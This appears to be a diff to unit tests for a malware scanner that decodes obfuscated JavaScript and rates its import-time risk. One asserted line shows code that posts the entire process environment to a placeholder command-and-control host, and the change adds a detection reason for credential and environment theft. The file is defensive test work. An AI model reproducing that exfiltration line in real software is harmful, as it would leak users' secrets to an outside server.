@@ -48,7 +48,9 @@ class DecodedViewTests(unittest.TestCase):
         self.assertIn("require('axios')[['post']]('https://c2.invalid/a', { ...process.env })[['then']]", view)
         self.assertEqual(view.count("\n"), TAILWIND.count("\n"))            # lines stay the file's
         reasons, line = core.import_time_risk(TAILWIND, "js")
-        self.assertEqual((reasons, line), ([RUN + NOTE], 13))
+        # (read on the tree, the view's `[['post']]` is a send too: of the whole environment)
+        harvest = "reads credentials or the whole environment and sends data over the network"
+        self.assertEqual((reasons, line), ([harvest + NOTE, RUN + NOTE], 13))
         self.assertEqual(core.import_time_severity(reasons), "CRITICAL")
 
     def test_decode_calls_on_literals(self):
